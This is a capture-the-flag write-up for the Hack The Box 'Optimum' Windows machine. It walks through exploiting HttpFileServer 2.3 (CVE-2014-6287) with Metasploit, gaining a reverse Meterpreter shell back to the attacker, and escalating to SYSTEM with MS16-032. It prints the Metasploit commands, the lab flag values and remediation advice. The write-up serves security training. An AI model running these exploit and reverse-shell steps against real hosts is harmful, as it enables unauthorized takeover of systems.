# HTB - Optimum

**Difficulty:** Easy  
**OS:** Windows  
**Status:** Retired ✅

---

## Summary

Optimum is an Easy Windows machine running HttpFileServer 2.3, which is vulnerable to a remote code execution bug (CVE-2014-6287). Initial access is obtained as a low-privilege user via Metasploit. Privilege escalation to SYSTEM is achieved using MS16-032, a vulnerability in the Windows Secondary Logon Service.

---

## Tools Used

- Nmap
- Metasploit Framework (exploit/windows/http/rejetto_hfs_exec)
- Metasploit Framework (post/multi/recon/local_exploit_suggester)
- Metasploit Framework (exploit/windows/local/ms16_032_secondary_logon_handle_privesc)

---

## Steps

### 1. Enumeration

```bash
nmap -sV -sC --min-rate 5000 10.129.26.60
```

**Open ports:**
- 80 → HTTP — HttpFileServer httpd 2.3

Nmap identifies the service as **HttpFileServer 2.3** running on Windows. A quick search reveals this version is vulnerable to CVE-2014-6287, a remote code execution bug in the `findMacroMarker` function.

---

### 2. Initial Access with Metasploit

```bash
msfconsole
use exploit/windows/http/rejetto_hfs_exec
set RHOSTS 10.129.26.60
set LHOST tun0
set payload windows/meterpreter/reverse_tcp
set LPORT 4444
run
```

A Meterpreter session opens as **OPTIMUM\kostas**.

---

### 3. User Flag

```bash
cat "c:/Users/kostas/Desktop/user.txt"
```

Flag: `2aa1ceba34553779932515ecb37c820e`

---

### 4. Privilege Escalation

Checking the system with `sysinfo` shows **Windows Server 2012 R2 x64**, but the Meterpreter session is x86. First, migrate to a x64 process:

```bash
ps
migrate 1732   # explorer.exe PID
background
```

Then use MS16-032 to escalate to SYSTEM:

```bash
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
set SESSION 1
set LHOST tun0
run
```

A new Meterpreter session opens as **NT AUTHORITY\SYSTEM**.

---

### 5. Root Flag

```bash
cat "c:/Users/Administrator/Desktop/root.txt"
```

Flag: `980589ee214d153a8a8dc5d78e59e614`

---

## What I Learned

- HttpFileServer 2.3 is vulnerable to RCE via CVE-2014-6287 — always check service versions during enumeration
- When Meterpreter architecture (x86) doesn't match the OS (x64), migrating to a x64 process is required before running local exploits
- MS16-032 is a reliable privilege escalation path on unpatched Windows Server 2012 R2
- Using `cat` directly in Meterpreter is more stable than opening a full shell when the session is unstable

---

## Remediation

- Update HttpFileServer to a patched version
- Apply Microsoft patch MS16-032
- Never expose file server management interfaces directly to the network
- Keep Windows systems fully patched and up to date
